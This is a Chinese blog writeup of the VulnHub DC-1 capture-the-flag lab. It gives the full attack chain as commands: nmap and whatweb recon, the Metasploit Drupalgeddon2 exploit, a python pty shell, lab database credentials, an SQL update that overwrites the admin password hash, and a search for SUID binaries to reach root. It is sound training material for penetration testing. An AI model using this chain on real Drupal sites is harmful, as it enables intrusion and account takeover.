---
title: VulnHub DC-1 靶场 Writeup
date: 2026-04-21 10:00:00
categories:
  - VulnHub靶场
tags:
  - VulnHub
  - Metasploit
  - Drupal
  - SUID提权
  - Writeup

---

## 解题流程：
准备过程，将kali（攻击机）与靶机放在同一网段下，可以直接通过kali得到靶机的真实IP

终端执行：ip a

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-01.png)

出现IP：192.168.111.129

然后用nmap：nmap -sV 192.168.111.0/24。因为两台机器处于同一网段中，前三段保持不对，最后一段是网给每台机子发的门牌号。通过扫描可以确定靶机所在IP

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-02.png)

看得出来80端口挂了一个网站，进行详细的指纹识别，看看底裤

工具是whatweb：whatweb [http://192.168.111.132](http://192.168.111.132)

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-03.png)

Drupal / MetaGenerator[Drupal 7]：Drupal 7搭建的网站有很多老漏洞啊，可以去找现成的exp

一个强大的开源工具：Metasploit 集成了最全的exp，对症下药即可一键get shell

输入 msfconsole 启动

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-04.png)

search Drupal 找存在过的历史CVE

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-05.png)

第二个Drupalgeddon 2在7.x和8.x版本通杀

执行：use exploit/unix/webapp/drupal_drupalgeddon2

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-06.png)

输入：set rhosts 靶机ip （设置需要远程执行的靶机ip）

再输入：run 开始攻击

出现meterpreter > 表示连接成功

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-07.png)

ls 看到flag1.txt cat 读取

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-08.png)

这句是让我们找CMS的配置文件，Drupal的配置文件默认在sites/default/default.settings.php下

得到flag2

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-09.png)

里面记录着mysql数据库的账号密码，可以尝试连接mysql，flag2在里面

要想连接数据库，需要提权，在Meterpreter中输入shell，再手动输入python -c 'import pty; pty.spawn("/bin/bash")'提权。

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-10.png)

出现www-data@DC-1: 就是提权成功

mysql -u dbuser -p

Enter password: R0ck3t

连接数据库

在数据库drupaldb的users表中找到了admin的账号密码，但是加密过的，不过既然都连接了数据库，可以修改密码，Drupal的哈希算法在php scripts/password-hash.sh下

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-11.png)

运行得到加密后的密码

执行：mysql> update users set pass='$S$DTN3s3syL3HztYhe6TDZYA2TgvXr.oCiCj.UYZVTt/djixV2dR50' where name='admin';

在靶机页面登录

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-12.png)

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-13.png)

得到flag3：特殊权限可以帮助**FIND** passwd——但你需要执行 - exec 才能弄清楚如何获取 shadow 中的内容。提示我们读passwd文件

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-14.png)

找到了flag4，读取

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-15.png)

我们现在是普通用户权限，意思要提权到root用户，且提醒了用find命令。

执行：find / -perm -u=s -type f 2>/dev/null 找特殊权限

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-16.png)

有/user/bin/find，也意味着find有SUID权限

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-17.png)

成功成为root

![](/img/posts/vulnhub-dc-1/vulnhub-dc-1-18.png)

找到最后的flag。

## 知识点总结：
1.Metasploit工具的使用

2.mysql数据库：账号密码的修改

3.find SUID提权
